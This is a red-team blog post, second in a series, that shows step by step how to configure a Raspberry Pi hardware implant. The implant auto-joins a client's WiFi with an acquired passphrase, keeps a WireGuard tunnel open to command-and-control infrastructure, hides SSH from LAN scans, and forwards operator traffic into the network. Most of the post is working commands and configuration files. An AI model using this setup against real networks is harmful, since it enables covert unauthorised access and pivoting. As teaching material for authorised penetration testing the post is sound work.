---
title: "Configuring the Software for Our Hardware Implant"
date: 2023-10-02T16:48:00-04:00
draft: false # Set 'false' to publish
description: "Software configuration for secure C2"
categories:
- Red Team
tags:
- Software
- Initial Access
- WiFi
---

This is the second post in a multi-part series on creating a hardware implant for initial access. Stay tuned for updates!

---

### Recap
In the last post we detailed the rationale behind why we were building a hardware implant in the first place and the 
hardware we used to construct the implant. If you haven't read it, check it out [here]({{< ref "/posts/rat-series/hardware" >}}).

### Requirements
Since this project stems from a real world engagement we were involved with, it was crucial that the traffic between our implant
and our infrastructure was secured as it egressed the client network. For this we turned to the following technologies:
- Wireguard to securely connect back to our infrastructure
- SSH to enable secure operator connections to the implant itself
- Raspberry Pi OS as a platform for our implant

### The Software
Wireguard is a light-weight, modern VPN technology that is simple to setup and secure to boot. Additional information can
be found on its [homepage](https://www.wireguard.com).

SSH provides a login shell that is cryptographically secured, perfect for operator interaction on the implant. Additionally,
using SSH tunneling allowed our operators to set up corresponding tunnels and use `proxychains` to tunnel commands through
the implant to evaluate our client's network.

Raspberry Pi OS, formerly known as Raspbian, is a Debian-based ARM operating system for Raspberry Pi SBCs. Additional
information can be found on the [homepage](https://www.raspberrypi.com/software/).

The question though, is how can we tie these technologies together to enable remote access to the target network?

#### The Process
At this point, we had the client's WiFi PSK, a secure connection back to our infrastructue planed out, and a way for our
operators to interact with the target network via the implant. We just needed to configure everything to work together.

##### WiFi
Starting with WiFi, we needed to configure the OS to automatically connect to the target's WiFi network (and then 
connect back to us).

By default, Raspberry Pi OS utilizes the `wpa_supplicant` service to connect to available networks. Because we knew the 
client's PSK and SSID, we could pre-configure the Pi to connect to the target network utilizing the `wpa_passphrase` command.

```bash
aermored@implant:~$ wpa_passphrase CLIENTSSID "The acquired psk"
 network={
         ssid="CLIENTSSID"
         #psk="The acquired psk"
         psk=406c6f5825ffc2fef9f0e4d72f44c863aac8226b629042fceb468aa67c8ac1da
 }
```

The output of this command can be appended to the `/etc/wpa_supplicant.conf` file to cause the Pi to automatically associate
with and connect to the target network on boot-up (we additionally added our connection details for testing purposes).
Perfect!

##### Wireguard
Next up, we needed to ensure that when powered on, the implant would establish a Wireguard VPN back to our C2 infrastructure.

We first did an `apt update` and an `apt install wireguard` to grab the relevant Wireguard packages for Raspberry Pi OS.
After this, we could run the following one-liner to generate the necessary Wireguard keypair:

```bash
aermored@implant:~$ umask 077; wg genkey | tee privatekey | wg pubkey > publickey
```

This command first sets the creation mask of the files to 600 with `umask` and then generates a random Wireguard private 
key. The output of this command is piped into `tee` to write the private key to disk as `privatekey` in the current 
working directory and pipe the output back into `wg` to generate a public key based on a private key (that was piped in
in our case). The result of this command should leave two files in the current working directory:

```bash
aermored@implant:~$ ls -l
 total 8
 -rw------- 1 red red 45 Sep 17 18:13 privatekey
 -rw------- 1 red red 45 Sep 17 18:13 publickey
```

```bash
aermored@implant:~$ cat privatekey
 CO6y+c+0sGHIrQU9AIaM6v1Bb4HKWlsh4HEYGYSLvmM=
```

> Keep the private key safe! This is an example key for the sake of this post.

```bash
aermored@implant:~$ cat publickey
 KTd2opaUpRGaZkW2pxwWF6RnPx6anGYGFeu6GQJk6gU=
```

Now that we had the required Wireguard credentials, we could configure the Pi as a Wireguard client to connect back to our
C2 infrastructure.

To do this, we created a Wireguard configuration file at `/etc/wireguard/wg0.conf`. The contents are below:
```bash
[Interface]
 PrivateKey = CO6y+c+0sGHIrQU9AIaM6v1Bb4HKWlsh4HEYGYSLvmM= (This is the output of the privatekey file)
 Address = 10.0.0.1/24 (This should reflect the configuration on the Wireguard server)

 [Peer]
 PublicKey = <contents-of-server-publickey> (This comes from the Wireguard server's public key)
 AllowedIPs = 0.0.0.0/0
 Endpoint = "server public ip and ListenPort" (Ex: 1.2.3.4:51820)
 PersistentKeepalive = 30
```

Once this is configured, we could run `wg-quick up wg0` to bring up the Wireguard interface. If everything is configured
correctly, we should see the following:
```bash
aermored@implant:~# wg show
 interface: wg0
   public key: KTd2opaUpRGaZkW2pxwWF6RnPx6anGYGFeu6GQJk6gU=
   private key: (hidden)
   listening port: 37849
   fwmark: 0xca6c

 peer: <contents-of-server-publickey> (This comes from the Wireguard server's public key)
   endpoint: 1.2.3.4:51820
   allowed ips: 0.0.0.0/0
   latest handshake: 1 second ago
   transfer: 1.43 KiB received, 936 B sent
   persistent keepalive: every 30 seconds
```

Great! Looks like the Wireguard interface is connected to our infrastructure. Lastly for the Wireguard portion, we need 
to enable the service at boot-up. To do this, we run the following:
```bash
aermored@implant:~# systemctl enable wg-quick@wg0.service
 Created symlink /etc/systemd/system/multi-user.target.wants/wg-quick@wg0.service → /etc/systemd/system/wg-quick@.service.
```
We still have a few more steps to complete  prior to deploying the implant against our target though.

##### SSH
With the Wireguard tunnel established, we needed to ensure that SSH was only listening on the Wireguard IP we configured.
This ensures that anyone at our client couldn't potentially scan the LAN IP of our implant and see that it was listening
on port 22 which might raise some suspicion. 

To do this is straightforward: in `/etc/ssh/sshd_config` we simply change
the default `ListenAddress 0.0.0.0` to `ListenAddress 10.0.0.1` and restart the `ssh` service with a `systemctl restart 
ssh.service` command. 

#### Final steps
Our implant should automatically connect to the target network on boot-up, start the Wireguard interface, and finally
start SSH listening on the Wireguard IP at this point, but we need to guarantee that everything is started in the correct
order otherwise we won't be able to connect.

To do this, we only need to change the `wg-quick@.service` definition:
```bash
aermored@implant:~# systemctl edit --full wg-quick@.service

 [Unit]
 Description=WireGuard via wg-quick(8) for %I
 After=network-online.target nss-lookup.target
 Wants=network-online.target nss-lookup.target
 ...
```

We just need to add a `Before` directive to ensure that the `wg-quick@.service` starts before the `ssh.service`
```bash
[Unit]
 Description=WireGuard via wg-quick(8) for %I
 Before=ssh.service (Add this line to cause Wireguard to come up before ssh)
 After=network-online.target nss-lookup.target
 Wants=network-online.target nss-lookup.target
```

Additionally, we need to ensure the implant can forward traffic on behalf of our operators. We can accomplish this by
running the following command:
```bash
aermored@implant:~# sed -i "s/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g" /etc/sysctl.conf && sysctl -p
```

This will enable IP forwarding persistently by enabling the required setting in the `/etc/sysctl.conf` file and then setting
the running value to `1`.

With that completed, we reboot the implant and try to log into the Wireguard IP...
```bash
red in ~ λ ssh aermored@10.0.0.1
 aermored@10.0.0.1's password:
 Linux implant 6.1.21+ #1642 Mon Apr  3 17:19:14 BST 2023 armv6l

 The programs included with the Debian GNU/Linux system are free software;
 the exact distribution terms for each program are described in the
 individual files in /usr/share/doc/*/copyright.

 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 Last login: Tue Sep 19 16:46:20 2023 from 192.168.1.69
 aermored@implant:~ $
```

Success! Now to deploy it against our client. We'll cover how we used the implant in the next post in the series.

---

Other posts in the hardware implant series:
- [Part 1: Hardware Implants as an Initial Access Vector]({{< ref "/posts/rat-series/hardware" >}})
- [Part 2: Configuring the Software for Our Hardware Implant]({{< ref "/posts/rat-series/software" >}})